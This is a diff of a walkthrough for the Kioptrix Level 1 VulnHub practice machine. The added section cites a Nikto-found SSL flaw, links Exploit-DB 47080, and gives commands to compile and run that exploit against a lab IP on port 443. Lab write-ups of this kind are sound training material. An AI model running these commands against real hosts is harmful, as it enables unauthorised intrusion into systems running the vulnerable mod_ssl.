@@ -1,10 +1,9 @@
-# Walkthrough: [Kioptrix: Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
+# Walkthrough: [Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
 
 ## Table of Contents
 
 - [Enumeration](#enumeration)
-- [Penetration](#penetration)
-- [Privilege Escelation](#privilege-escelation)
+- [Penetration & Privilege Escelation](#penetration-&-privilege-escelation)
 - [Bonus](#bonus)
 	- [Bruteforce](#brute-force)
 	- [Intresting Files](#intresting-files)
@@ -74,10 +73,12 @@
     Adapter address: 00:00:00:00:00:00
     </pre>
 
-## Penetration:
-
-## Privilege Escelation:
-
+## Penetration & Privilege Escelation
+- Nikto revealed a [ssl vurnerability](https://www.exploit-db.com/exploits/47080)
+	* Download and compile the exploit:   
+	`cd ~/Downloads/ && sudo apt-get install libssl-dev && gcc -o OpenFuck 47080.c -lcrypto`
+	* Run the exploit: `./OpenFuck 0x6b 192.168.0.14 443`
+---
 
 ## Bonus
 
